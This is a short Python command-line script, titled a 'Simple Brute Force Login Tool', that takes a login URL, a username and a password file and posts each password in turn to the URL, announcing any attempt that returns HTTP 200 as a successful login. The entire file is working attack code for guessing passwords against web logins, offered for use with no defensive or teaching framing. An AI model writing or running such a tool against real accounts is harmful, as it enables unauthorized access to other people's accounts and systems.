import argparse
import requests

def brute_force_login(url, username, password_file):
    try:
        with open(password_file, 'r') as f:
            for password in f:
                password = password.strip()
                response = requests.post(url, data={"username": username, "password": password})
                if response.status_code == 200:
                    print(f"Successful login with password: {password}")
                    return
                else:
                    print(f"Attempt failed with password: {password}")
    except FileNotFoundError:
        print("Password file not found.")
    except Exception as e:
        print("An error occurred:", e)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Simple Brute Force Login Tool")
    parser.add_argument("url", type=str, help="Login URL")
    parser.add_argument("username", type=str, help="Username for login")
    parser.add_argument("password_file", type=str, help="File with passwords to try")
    args = parser.parse_args()

    brute_force_login(args.url, args.username, args.password_file)
